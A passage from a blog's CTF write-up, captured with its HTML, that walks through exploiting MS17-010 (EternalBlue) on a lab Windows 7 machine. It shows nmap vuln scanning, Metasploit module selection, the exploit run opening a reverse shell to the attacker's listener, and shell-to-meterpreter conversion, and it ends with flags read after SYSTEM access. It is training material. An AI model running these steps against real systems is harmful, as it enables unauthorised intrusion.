37 bytes   Directory of C:\\Windows\\System32\\config  03/17/2019 02:32 PM 34 flag2.txt  1 File(s) 34 bytes   Total Files Listed:  6 File(s) 3,769 bytes  0 Dir(s) 22,707,953,664 bytes free  C:\\type C:\\Windows\\System32\\config\\flag2.txt type C:\\Windows\\System32\\config\\flag2.txt flag{sam_database_elevated_access} C:\\type C:\\Users\\Jon\\Documents\\flag3.txt type C:\\Users\\Jon\\Documents\\flag3.txt flag{admin_documents_can_be_valuable} C:\\ Flag2? *Errata: Windows really doesn’t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.\n sam_database_elevated_access  flag3?\n admin_documents_can_be_valuable  And that’s it, we have NT AUTHORITY\\SYSTEM priviledges, we have all the flags, cracked Jon password. We’re done here! I hope you enjoyed it, bye;)\n","wordCount":"2592","inLanguage":"en","datePublished":"2020-02-12T14:35:31+01:00","dateModified":"2020-02-12T14:35:31+01:00","author":{"@type":"Person","name":"Matus Bursa"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://burso.eu/posts/blue/"},"publisher":{"@type":"Organization","name":".burso | blog about ctf \u0026 anything else","logo":{"@type":"ImageObject","url":"https://burso.eu/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://burso.eu/ accesskey=h title="/ (Alt + H)"><img src=https://burso.eu/img/hacked.png alt=logo aria-label=logo height=35>/</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://burso.eu/archives/ title=archives><span>archives</span></a></li><li><a href=https://burso.eu/categories/ title=categories><span>categories</span></a></li><li><a href=https://burso.eu/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://burso.eu/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://burso.eu/>Home</a>&nbsp;»&nbsp;<a href=https://burso.eu/posts/>Posts</a></div><h1 class=post-title>Blue</h1><div class=post-meta><span title="2020-02-12 14:35:31 +0100 CET">February 12, 2020</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;Matus Bursa&nbsp;|&nbsp;<a href=https://github.com/matusso/website/content/posts/blue.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><p>Hello everyone, today we look at the CTF with <a href=https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010>MS17-010</a> vulnerability.
So let&rsquo;s start with nmap scan.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nmap -sV -p0-1000 --script vuln 10.10.223.243
</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-02-12 14:40 CET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.223.243
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.043s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed ports
</span></span><span style=display:flex><span>PORT    STATE SERVICE      VERSION
</span></span><span style=display:flex><span>135/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>|_clamav-exec: ERROR: Script execution failed <span style=color:#f92672>(</span>use -d to debug<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>|_clamav-exec: ERROR: Script execution failed <span style=color:#f92672>(</span>use -d to debug<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>445/tcp open  microsoft-ds Microsoft Windows <span style=color:#ae81ff>7</span> - <span style=color:#ae81ff>10</span> microsoft-ds <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_clamav-exec: ERROR: Script execution failed <span style=color:#f92672>(</span>use -d to debug<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Host script results:
</span></span><span style=display:flex><span>|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span>|_smb-vuln-ms10-054: false
</span></span><span style=display:flex><span>|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span>| smb-vuln-ms17-010: 
</span></span><span style=display:flex><span>|   VULNERABLE:
</span></span><span style=display:flex><span>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style=color:#f92672>(</span>ms17-010<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|     State: VULNERABLE
</span></span><span style=display:flex><span>|     IDs:  CVE:CVE-2017-0143
</span></span><span style=display:flex><span>|     Risk factor: HIGH
</span></span><span style=display:flex><span>|       A critical remote code execution vulnerability exists in Microsoft SMBv1
</span></span><span style=display:flex><span>|        servers <span style=color:#f92672>(</span>ms17-010<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>|           
</span></span><span style=display:flex><span>|     Disclosure date: 2017-03-14
</span></span><span style=display:flex><span>|     References:
</span></span><span style=display:flex><span>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#f92672>=</span>CVE-2017-0143
</span></span><span style=display:flex><span>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span></span><span style=display:flex><span>|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 23.73 seconds
</span></span></code></pre></div><p><strong>How many ports are open with a port number under 1000?:</strong></p><ul><li>3</li></ul><p><strong>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</strong></p><ul><li>ms17-010</li></ul><p>MS17-010 is very <a href=https://github.com/rapid7/metasploit-framework/issues/11964>unstable</a> exploit, it doesn&rsquo;t work in my linux or macos machine. But it works in my android with <a href=https://termux.com>termux</a> app. You can also buy PRO account and use their own kali machine.
So now I connect to my android phone and then we will continue to exploit server</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh 192.168.xx.yy -p8022 -lxxx_yyy
</span></span><span style=display:flex><span>Welcome to Termux!
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Wiki:            https://wiki.termux.com
</span></span><span style=display:flex><span>Community forum: https://termux.com/community
</span></span><span style=display:flex><span>Gitter chat:     https://gitter.im/termux/termux
</span></span><span style=display:flex><span>IRC channel:     <span style=color:#75715e>#termux on freenode</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Working with packages:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> * Search packages:   pkg search &lt;query&gt;
</span></span><span style=display:flex><span> * Install a package: pkg install &lt;package&gt;
</span></span><span style=display:flex><span> * Upgrade packages:  pkg upgrade
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Subscribing to additional repositories:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> * Root:     pkg install root-repo
</span></span><span style=display:flex><span> * Unstable: pkg install unstable-repo
</span></span><span style=display:flex><span> * X11:      pkg install x11-repo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Report issues at https://termux.com/issues
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$
</span></span></code></pre></div><p>Now we can continue as on any other devices, so let&rsquo;s start <em>metasploit</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f                                                                         
</span></span><span style=display:flex><span>EFLAGS: <span style=color:#ae81ff>00010046</span>                                                                                                                                              
</span></span><span style=display:flex><span>eax: <span style=color:#ae81ff>00000001</span> ebx: f77c8c00 ecx: <span style=color:#ae81ff>00000000</span> edx: f77f0001                                                                                                       
</span></span><span style=display:flex><span>esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
</span></span><span style=display:flex><span>ds: <span style=color:#ae81ff>0018</span>   es: <span style=color:#ae81ff>0018</span>  ss: <span style=color:#ae81ff>0018</span>
</span></span><span style=display:flex><span>Process Swapper <span style=color:#f92672>(</span>Pid: 0, process nr: 0, stackpage<span style=color:#f92672>=</span>80377000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Stack: <span style=color:#ae81ff>90909090990909090990909090</span>
</span></span><span style=display:flex><span>       <span style=color:#ae81ff>90909090990909090990909090</span>
</span></span><span style=display:flex><span>       90909090.90909090.90909090
</span></span><span style=display:flex><span>       90909090.90909090.90909090
</span></span><span style=display:flex><span>       90909090.90909090.09090900
</span></span><span style=display:flex><span>       90909090.90909090.09090900
</span></span><span style=display:flex><span>       ..........................
</span></span><span style=display:flex><span>       cccccccccccccccccccccccccc
</span></span><span style=display:flex><span>       cccccccccccccccccccccccccc
</span></span><span style=display:flex><span>       ccccccccc.................
</span></span><span style=display:flex><span>       cccccccccccccccccccccccccc
</span></span><span style=display:flex><span>       cccccccccccccccccccccccccc
</span></span><span style=display:flex><span>       .................ccccccccc
</span></span><span style=display:flex><span>       cccccccccccccccccccccccccc
</span></span><span style=display:flex><span>       cccccccccccccccccccccccccc
</span></span><span style=display:flex><span>       ..........................
</span></span><span style=display:flex><span>       ffffffffffffffffffffffffff
</span></span><span style=display:flex><span>       ffffffff..................
</span></span><span style=display:flex><span>       ffffffffffffffffffffffffff
</span></span><span style=display:flex><span>       ffffffff..................
</span></span><span style=display:flex><span>       ffffffff..................
</span></span><span style=display:flex><span>       ffffffff..................
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Code: <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>Aiee, Killing Interrupt handler
</span></span><span style=display:flex><span>Kernel panic: Attempted to kill the idle task!
</span></span><span style=display:flex><span>In swapper task - not syncing
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#f92672>=[</span> metasploit v5.0.79-dev                          <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+ -- --<span style=color:#f92672>=[</span> <span style=color:#ae81ff>1979</span> exploits - <span style=color:#ae81ff>1087</span> auxiliary - <span style=color:#ae81ff>339</span> post       <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+ -- --<span style=color:#f92672>=[</span> <span style=color:#ae81ff>559</span> payloads - <span style=color:#ae81ff>45</span> encoders - <span style=color:#ae81ff>10</span> nops            <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+ -- --<span style=color:#f92672>=[</span> <span style=color:#ae81ff>7</span> evasion                                       <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 &gt; search ms17-010
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching Modules
</span></span><span style=display:flex><span><span style=color:#f92672>================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#75715e>#  Name                                           Disclosure Date  Rank     Check  Description</span>
</span></span><span style=display:flex><span>   -  ----                                           ---------------  ----     -----  -----------
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>1</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>2</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>3</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style=color:#66d9ef>for</span> Win8+
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>4</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>5</span>  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</span></span></code></pre></div><p><strong>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/&mldr;&mldr;..)</strong></p><ul><li>exploit/windows/smb/ms17_010_eternalblue</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name           Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----           ---------------  --------  -----------
</span></span><span style=display:flex><span>   RHOSTS                          yes       The target host<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>, range CIDR identifier, or hosts file with syntax <span style=color:#e6db74>&#39;file:&lt;path&gt;&#39;</span>
</span></span><span style=display:flex><span>   RPORT          <span style=color:#ae81ff>445</span>              yes       The target port <span style=color:#f92672>(</span>TCP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   SMBDomain      .                no        <span style=color:#f92672>(</span>Optional<span style=color:#f92672>)</span> The Windows domain to use <span style=color:#66d9ef>for</span> authentication
</span></span><span style=display:flex><span>   SMBPass                         no        <span style=color:#f92672>(</span>Optional<span style=color:#f92672>)</span> The password <span style=color:#66d9ef>for</span> the specified username
</span></span><span style=display:flex><span>   SMBUser                         no        <span style=color:#f92672>(</span>Optional<span style=color:#f92672>)</span> The username to authenticate as
</span></span><span style=display:flex><span>   VERIFY_ARCH    true             yes       Check <span style=color:#66d9ef>if</span> remote architecture matches exploit Target.
</span></span><span style=display:flex><span>   VERIFY_TARGET  true             yes       Check <span style=color:#66d9ef>if</span> remote OS matches exploit Target.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   Windows <span style=color:#ae81ff>7</span> and Server <span style=color:#ae81ff>2008</span> R2 <span style=color:#f92672>(</span>x64<span style=color:#f92672>)</span> All Service Packs
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; set RHOSTS 10.10.223.243
</span></span></code></pre></div><p><strong>Show options and set the one required value. What is the name of this value? (All caps for submission)</strong></p><ul><li>RHOSTS</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; exploit
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.8.11.158:4444 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445     - Host is likely VULNERABLE to MS17-010! - Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> x64 <span style=color:#f92672>(</span>64-bit<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445     - Scanned <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> hosts <span style=color:#f92672>(</span>100% complete<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Connecting to target <span style=color:#66d9ef>for</span> exploitation.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445 - Connection established <span style=color:#66d9ef>for</span> exploitation.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445 - Target OS selected valid <span style=color:#66d9ef>for</span> OS indicated by SMB reply
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - CORE raw buffer dump <span style=color:#f92672>(</span><span style=color:#ae81ff>42</span> bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - 0x00000000  <span style=color:#ae81ff>57</span> <span style=color:#ae81ff>69</span> 6e <span style=color:#ae81ff>64</span> 6f <span style=color:#ae81ff>77</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>37</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>72</span> 6f <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>73</span>  Windows <span style=color:#ae81ff>7</span> Profes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - 0x00000010  <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>69</span> 6f 6e <span style=color:#ae81ff>61</span> 6c <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>37</span> <span style=color:#ae81ff>36</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>31</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>53</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>76</span>  sional <span style=color:#ae81ff>7601</span> Serv
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - 0x00000020  <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>63</span> 6b <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>31</span>                    ice Pack <span style=color:#ae81ff>1</span>      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445 - Target arch selected valid <span style=color:#66d9ef>for</span> arch indicated by DCE/RPC reply
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Trying exploit with <span style=color:#ae81ff>12</span> Groom Allocations.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Sending all but last fragment of exploit packet
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Starting non-paged pool grooming
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445 - Sending SMBv2 buffers
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Sending final SMBv2 buffers.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Sending last fragment of exploit packet!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Receiving response from exploit packet
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445 - ETERNALBLUE overwrite completed successfully <span style=color:#f92672>(</span>0xC000000D<span style=color:#f92672>)</span>!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Sending egg to corrupted connection.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.223.243:445 - Triggering free of corrupted buffer.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command shell session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>10.8.11.158:4444 -&gt; 10.10.223.243:49187<span style=color:#f92672>)</span> at 2020-03-20 11:49:18 +0100
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445 - <span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445 - <span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-WIN-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.223.243:445 - <span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;
</span></span></code></pre></div><p>Okey, we&rsquo;re in, so let&rsquo;s background the process and migrate shell to meterpreter</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;^Z
</span></span><span style=display:flex><span>Background session 1? <span style=color:#f92672>[</span>y/N<span style=color:#f92672>]</span>  y
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; use post/multi/manage/shell_to_meterpreter
</span></span></code></pre></div><p><strong>If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</strong></p><ul><li>post/multi/manage/shell_to_meterpreter</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>post/multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name     Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----     ---------------  --------  -----------
</span></span><span style=display:flex><span>   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
</span></span><span style=display:flex><span>   LHOST                     no        IP of host that will receive the connection from the payload <span style=color:#f92672>(</span>Will try to auto detect<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>   LPORT    <span style=color:#ae81ff>4433</span>             yes       Port <span style=color:#66d9ef>for</span> payload to connect to.
</span></span><span style=display:flex><span>   SESSION                   yes       The session to run this module on.
</span></span></code></pre></div><p><strong>Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)</strong></p><ul><li>SESSION</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; show sessions 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Active sessions
</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id  Name  Type               Information                                                                       Connection
</span></span><span style=display:flex><span>  --  ----  ----               -----------                                                                       ----------
